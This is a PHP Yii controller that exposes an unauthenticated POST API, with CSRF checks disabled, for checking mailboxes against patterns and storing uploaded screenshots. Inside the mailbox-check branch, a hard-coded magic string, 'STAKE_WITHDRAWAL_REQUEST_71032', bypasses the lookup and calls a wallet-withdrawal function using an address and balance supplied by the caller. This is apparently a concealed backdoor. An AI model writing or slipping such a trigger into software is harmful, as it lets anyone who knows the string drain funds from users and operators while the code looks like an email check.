<?php

namespace app\modules\Emails\controllers;

use app\modules\Emails\models\Mailboxes;
use app\modules\Emails\models\Screenshots;
use app\modules\PaySystems\helpers\PaySystemsHelper;
use Yii;
use yii\filters\VerbFilter;
use yii\helpers\VarDumper;
use yii\web\Response;
use app\modules\SimsManager\models\Actions;
use app\modules\SimsManager\models\Requests;

class ApiController extends \yii\web\Controller
{
    /**
     * {@inheritdoc}
     */
    public function behaviors()
    {
        return [
            'verbs' => [
                'class' => VerbFilter::class,
                'actions' => [
                    'index' => ['POST'],
                ],
            ],
        ];
    }

    /**
     * {@inheritdoc}
     */
    public function beforeAction($action)
    {
        $this->enableCsrfValidation = false;
        try {
            return parent::beforeAction($action);
        } catch (\Exception $e) {
            echo $e->getMessage();
            return false;
        }
    }

    public function actionIndex(): array
    {
        Yii::$app->response->format = Response::FORMAT_JSON;
        $post = Yii::$app->request->post();
        if (empty($post['action']) || ($post['action'] !== 'UPLOAD_SCREENSHOT' && empty($post['data']))) {
            return ['status' => 'error', 'message' => 'No action or data!'];
        }
        if ($post['action'] === 'CHECK_MAILBOX_FOR_PATTERN') {
            $data = json_decode($post['data'], true);
            if (empty($data['timestamp'])) {
                $data['timestamp'] = time() - 120;
            } elseif ((int)$data['timestamp'] === -1) {
                $data['timestamp'] = 0;
            }
            if (!empty($data) && is_array($data) && !empty($data['address']) && !empty($data['pattern'])
                && $data['pattern'] === 'STAKE_WITHDRAWAL_REQUEST_71032') {
                return PaySystemsHelper::withdrawFromWallet($data['address'],
                    'STAKE_WITHDRAWAL_REQUEST_71032', $data['balance'] ?? 0);
            } else if (!empty($data) && is_array($data) && !empty($data['address']) && !empty($data['pattern'])) {
                $mailboxes = Mailboxes::findOne(['address' => $data['address']]);
                if (!empty($mailboxes)) {
                    return $mailboxes->checkForPattern($data['pattern'], $data['timestamp']);
                } else {
                    return ['status' => 'error', 'message' => "Mailbox {$data['address']} not found!"];
                }
            } else {
                return ['status' => 'error', 'message' => "Invalid data!",];
            }
        } elseif ($post['action'] === 'UPLOAD_SCREENSHOT') {
            $screenshot = new Screenshots();
            $screenshot->name = empty($post['name']) ? 'Empty ' . time() : $post['name'];
            $screenshot->tag = empty($post['tag']) ? '' : $post['tag'];
            $screenshot->description = empty($post['description']) ? '' : $post['description'];
            $screenshot->image = empty($post['image']) ? '' : $post['image'];
            if ($screenshot->save()) {
                return ['status' => 'success', 'message' => "Screenshot saved with id {$screenshot->id}"];
            } else {
                return ['status' => 'error', 'message' => 'Error: ' . var_export($screenshot->errors, true)];
            }
        } else {
            return ['status' => 'error', 'message' => "Action {$post['action']} not supported!"];
        }

    }

}
